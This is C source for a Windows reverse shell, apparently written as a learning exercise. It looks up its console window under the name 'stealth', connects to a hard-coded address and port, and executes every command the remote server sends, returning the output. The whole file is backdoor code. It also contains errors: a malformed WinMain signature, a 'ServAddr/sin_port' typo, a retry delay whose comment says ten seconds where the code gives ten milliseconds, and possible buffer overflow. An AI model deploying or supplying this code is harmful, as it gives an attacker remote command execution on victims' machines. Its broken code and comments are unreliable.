#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>


/*
 * NOTE
 * This code will be EXTENSIVELY commented
 * I have never done socket programming before, and will write out
 * what each line does for personal reference
 */

#define bzero(p, size) (void) memset((p), '\0', (size)); // because memset will be used many times

int sock;

void Shell()
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while(1)
	{
		jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		
		recv(sock, buffer, sizeof(buffer), 0); // receives command from server and stores in buffer

		if (!strncmp("q", buffer, 1)) // checks if command in buffer is "q"
		{
			closesocket(sock); // closes opened socket
			WSACleanup(); // performs windows cleanup
			exit(0); // end program
		} 
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r"); // execute command in buffer and store command output in the file fp points to
			while(fgets(container, sizeof(container), fp)) // store contents of file, identified by pointer fp, in container
			{
				strcat(total_response, container); // only concatonate container to total_response if fgets is successful
			}
			send(sock, total_response, sizeof(total_response), 0); // sends character array total_response back to the server
			fclose(fp); // closes file stream
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	HWND stealth; // windows window handle
	AllocConsole(); // allocates a new console for windows calls
	stealth = FindWindowA("ConsoleWindowClass", NULL); // returns the console window handle, name parameter is left blank because only 1 exists
	
	ShowWindow(stealth, nCmdShow); //or just have int literal "0" instead of nCmdShow

	struct sockaddr_in ServAddr; // initialize a sockaddr_in structure - specifies address and port for IPV4/AF_INET
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData; //contains data about windows sockets, needed to establish a connection to windows machine

	ServIP = "10.0.2.15"; // hard code to IP of receiving server
	ServPort = 50005; //any port that exists and is not being used works

	// checks if connection is successful
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0); // first two params specificy IPV4 and TCP - sets up socket
	
	memset(&ServAddr, '\0', sizeof(ServAddr)); // sets contents of ServAddr address to null 
	ServAddr.sin_family = AF_INET; // sets sin_family member to AF_INET/IPV4 (must always be AF_INET)
	
		
	// converts ServIP and ServPort to address and port values (int and 16-bit number in network byte order)
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr/sin_port = htons(ServPort);

	// attempt to connect every 10 seconds until a connection is succesful
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
	}
	
	Shell();
}
